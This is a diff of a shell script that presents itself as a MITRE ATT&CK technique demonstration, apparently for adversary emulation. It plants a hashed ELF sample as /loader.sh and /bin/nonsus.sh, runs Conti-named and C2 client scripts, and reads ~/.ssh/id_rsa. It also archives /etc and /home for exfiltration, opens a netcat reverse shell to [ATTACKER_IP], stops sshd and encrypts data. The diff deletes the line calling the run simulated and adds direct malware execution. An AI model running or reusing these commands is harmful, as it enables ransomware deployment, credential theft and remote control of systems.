@@ -54,12 +54,12 @@ sleep 3
 # Create Shadow Copies 
 echo "[+] Creating copies in suspicious pladces"
 cat 05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 > /loader.sh
-chmod 700 /loader.sh
+chmod +x /loader.sh
 
 # Additional Shadow Cppies 
 echo "[+] Creating more shadow copies" 
 cat 05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 > /bin/nonsus.sh
-chmod 700 /bin/nonsus.sh 
+chmod +x /bin/nonsus.sh 
 sleep 3 
 
 # make executaable
@@ -82,7 +82,7 @@ sleep 3
 
 # Make Executable 
 echo "[+] Changing C2 Client file permissions: executable" 
-chmod 700 c2.sh
+chmod +x c2.sh
 sleep 
 
 # Exectuion of Malware and Handlening 
@@ -92,7 +92,8 @@ conti.sh || true
 c2.sh || true 
 
 # Senario In Progress 
-
+sh loaderh.sh 
+sh conti.sh
 
 # MITRE ATT&CK TTP Demonstration Script
 # === Initial Access and Execution ===
@@ -154,10 +155,6 @@ cat ~/.ssh/id_rsa
 echo "[*] Archiving files for exfiltration..."
 tar -czvf collected_data.tar.gz /etc /home
 
-# === Command and Control ===
-echo "[*] Downloading a tool from a remote server..."
-wget http://[ATTACKER_IP]/malicious_tool.sh -O /tmp/malicious_tool.sh
-
 echo "[*] Creating reverse shell using netcat..."
 nc -e /bin/sh [ATTACKER_IP] [PORT]
 
@@ -172,7 +169,6 @@ service sshd stop || echo "[!] Failed to stop SSH service - Continuing..."
 echo "[*] Encrypting sensitive data..."
 tar -cf sensitive_data.tar /important_dir && openssl enc -aes-256-cbc -salt -in sensitive_data.tar -out sensitive_data.tar.enc -k [PASSWORD]
 
-echo "[*] Script execution completed. This simulated MITRE ATT&CK techniques in a controlled manner."
 
 ### Network Scanning Local 
 ### Nmap > Local Scanning > Recon List 
